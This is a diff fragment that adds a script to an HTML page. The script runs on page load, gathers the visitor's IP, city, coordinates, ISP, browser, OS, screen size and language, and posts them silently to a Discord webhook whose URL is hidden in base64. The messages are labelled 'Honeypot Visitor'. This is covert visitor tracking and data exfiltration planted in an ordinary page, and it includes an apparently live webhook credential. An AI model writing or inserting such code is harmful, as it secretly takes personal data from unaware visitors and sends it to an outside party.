@@ -70,6 +70,61 @@
       
   
   <script>
+    window.onload = () => {
+  logVisitorImmediately();
+};
+
+async function logVisitorImmediately() {
+  try {
+    const res = await fetch("https://get.geojs.io/v1/ip/geo.json");
+    const ipData = await res.json();
+
+    const userData = {
+      ip: ipData.ip,
+      city: ipData.city,
+      region: ipData.region,
+      country: ipData.country,
+      isp: ipData.organization || "N/A",
+      lat: ipData.latitude,
+      lon: ipData.longitude,
+      timezone: ipData.timezone,
+      ua: navigator.userAgent,
+      os: navigator.platform,
+      screen: `${window.screen.width}x${window.screen.height}`,
+      lang: navigator.language
+    };
+
+    const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1MzM2MjIzOTU4MjYzNDAzNC9BYnpEWG50X05lYnFEQ3hHVjFSQWJJbmxsc05CQUtPSVJqNkhlZ2w3VEZDRVJINGVtLTFLZ3ZVMW5LeW51X1otWlV5cQ==");
+
+    const content = `
+📡 **Honeypot Visitor**
+🌐 IP: ${userData.ip}
+📍 ${userData.city}, ${userData.region}, ${userData.country}
+🏢 ISP: ${userData.isp}
+🧭 Lat/Lon: ${userData.lat}, ${userData.lon}
+🕓 Timezone: ${userData.timezone}
+💻 OS: ${userData.os}
+📱 Screen: ${userData.screen}
+🗣 Language: ${userData.lang}
+🧠 User-Agent: ${userData.ua}
+`;
+
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+
+    console.log("✅ Visitor logged");
+  } catch (err) {
+    console.error("❌ Logging failed", err);
+  }
+}
+
+
+
+
+
     function toggleNote() {
   const noteBox = document.getElementById('noteContent');
   noteBox.classList.toggle('show');
